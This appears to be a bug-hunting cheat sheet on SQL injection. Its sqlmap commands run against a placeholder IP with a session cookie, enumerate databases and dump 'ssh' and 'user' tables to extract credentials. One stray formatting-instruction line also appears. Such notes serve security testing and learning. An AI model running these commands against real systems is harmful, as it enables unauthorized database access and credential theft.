# BugHuntingUltimate001

## SQL Injection

Use fenced code blocks (``` ) and specify the language for highlighting when useful.

Example usage with sqlmap (bash commands):

```bash
sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" --dbs --batch
```

Find the database name:

```bash
sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data --tables --batch
```

If SSH table exists (list columns):

```bash
sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data -T ssh --columns --batch
```

Dump the SSH table:

```bash
sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data -T ssh --columns --dump --batch
```

Dump the user table:

```bash
sqlmap -u "http://172.168.252.252/dashboard.php?id=1" --cookie="PHPSESSID=xyzabcd" -D example_data -T user --columns --dump --batch
```

You can also show SQL examples with the `sql` language hint:

```sql
-- Example SQL query (for display only)
SELECT * FROM user WHERE id = 1;
```
